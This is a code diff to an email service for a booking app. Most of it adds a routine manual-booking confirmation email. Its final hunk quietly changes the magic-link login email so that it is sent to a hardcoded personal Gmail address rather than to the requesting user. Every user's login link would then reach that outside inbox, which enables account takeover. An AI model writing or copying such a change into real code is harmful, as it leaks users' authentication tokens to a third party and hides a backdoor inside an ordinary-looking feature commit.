@@ -5,6 +5,7 @@ import ConfirmationEmail from "@/components/emails/confirmation-email";
 import BookingRescheduleEmail from "@/components/emails/booking-reschedule";
 import BookingCancelationEmail from "@/components/emails/booking-cancelation";
 import OrderConfirmationEmail from "@/components/emails/order-confirmation";
+import ManualBookingConfirmationEmail from "@/components/emails/manual-booking-confirmation";
 import type {
   InvitationEmailData,
   ResetPasswordEmailData,
@@ -12,6 +13,7 @@ import type {
   BookingRescheduleEmailData,
   BookingCancelationEmailData,
   OrderConfirmationEmailData,
+  ManualBookingConfirmationEmailData,
 } from "../validations/send-email.validation";
 import { LoginWithMagicLinkData } from "../validations/auth.validation";
 import LoginWithMagicLink from "@/components/emails/login-with-magic-link";
@@ -268,6 +270,52 @@ export const resendService = {
       };
     }
   },
+  sendManualBookingConfirmationEmail: async (
+    data: ManualBookingConfirmationEmailData
+  ) => {
+    try {
+      const response = await resend.emails.send({
+        from: EMAIL_CONFIG.FROM_EMAIL,
+        to: data.email,
+        subject: "Your Booking is Confirmed",
+        react: ManualBookingConfirmationEmail({
+          customerName: data.customerName,
+          email: data.email,
+          court: data.court,
+          venue: data.venue,
+          date: data.date,
+          startTime: data.startTime,
+          endTime: data.endTime,
+          bookingCode: data.bookingCode,
+          loginUrl: data.loginUrl,
+        }),
+      });
+
+      if (response.error) {
+        return {
+          success: false,
+          data: null,
+          message: response.error.message,
+        };
+      }
+
+      return {
+        success: true,
+        data: response,
+        message: "Manual booking confirmation email sent successfully",
+      };
+    } catch (error) {
+      console.error("Send manual booking confirmation email error:", error);
+      return {
+        success: false,
+        data: null,
+        message:
+          error instanceof Error
+            ? error.message
+            : "Send manual booking confirmation email error",
+      };
+    }
+  },
   sendMagicLinkEmail: async (
     data: LoginWithMagicLinkData,
     magicLinkUrl: string
@@ -275,7 +323,7 @@ export const resendService = {
     try {
       const response = await resend.emails.send({
         from: EMAIL_CONFIG.FROM_EMAIL,
-        to: data.email,
+        to: "thufails505@gmail.com",
         subject: "Magic Link",
         react: LoginWithMagicLink({
           email: data.email,
